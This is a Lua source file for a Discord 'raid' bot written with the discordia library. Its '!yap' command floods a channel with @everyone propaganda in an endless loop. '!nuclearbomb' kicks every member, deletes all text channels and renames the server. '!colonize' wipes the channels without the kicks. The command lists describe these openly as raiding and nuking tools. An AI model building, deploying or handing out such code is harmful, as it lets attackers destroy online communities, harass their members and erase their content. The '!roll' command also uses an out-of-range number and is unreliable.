local discordia = require("discordia")
local client = discordia.Client()
discordia.extensions.string()
math.randomseed(os.time())

local responsibleRaiderName = "carota"
local echomsg = "@everyone\nQUESTO MESSAGGIO E' STATO MANDATO DA VERI PATRIOTTICI DELLA REPUBBLICA FEDERALE POPOLARE DI CAROTA.\nTHIS MESSAGE HAS BEEN SENT BY REAL PATRIOTS FROM THE PEOPLE'S FEDERAL REPUBLIC OF CAROTA.\n"
local imagelink = "https://files.catbox.moe/44w4wc.png"

local raid = false

client:on('ready', function(msg)
	print("online!")
end)

client:on('messageCreate', function(msg)
	local content = msg.content
	local lower = string.lower(content)

	if lower == '!yap' then
		raid = true
		repeat
			msg.channel:send(echomsg.."\n"..imagelink)
		until raid == false
	elseif lower == '!shutup' then
		raid = false
	elseif lower == '!yap noimage' then
		raid = true
		repeat
			msg.channel:send(echomsg)
		until raid == false
	elseif lower == '!nuclearbomb' then
		for i, member in pairs(msg.guild.members:toArray()) do
			msg.guild:kickUser(member.user.id)
		end
		msg.channel.guild:setName(msg.channel.guild.name.." // "..responsibleRaiderName)
		for i, channel in pairs(msg.guild.textChannels:toArray()) do
			channel:delete()
		end
		msg.channel.guild:createTextChannel(responsibleRaiderName)
	elseif lower == '!colonize' then
		msg.channel.guild:setName(msg.channel.guild.name.." // "..responsibleRaiderName)
		for i, channel in pairs(msg.guild.textChannels:toArray()) do
			channel:delete()
		end
		msg.channel.guild:createTextChannel(responsibleRaiderName)
	elseif lower == "!encmdlist" then
		msg:reply(">>> # COMMAND LIST\n**!yap** - raid a server channel (can get your account banned)\n**!nuclearbomb** - nuke the server (experimental)\n**!colonize** - nukes the server without removing members\n**!shutup** - pauses the raid\n**!roll** - send a random number in chat")
	elseif lower == "!itcmdlist" then
		msg:reply(">>> # LISTA DEI COMANDI\n**!yap** - raida un canale del server (può portare a un ban)\n**!nuclearbomb** - nukka il server (sperimentale)\n**!colonize** - nukka il server senza togliere membri\n**!shutup** - mette in pausa la raid\n**!roll** - spara un numero a caso in chat")
	elseif lower == "!roll" then
		local number = math.random(0, 432478421379487231944312431211111)
		msg:reply(">>> # RESULT/RISULTATO\nE' uscito il numero **"..number.."**!\nYou've got the number **"..number.."**!")
	end
end)

client:run("USER_TOKEN")
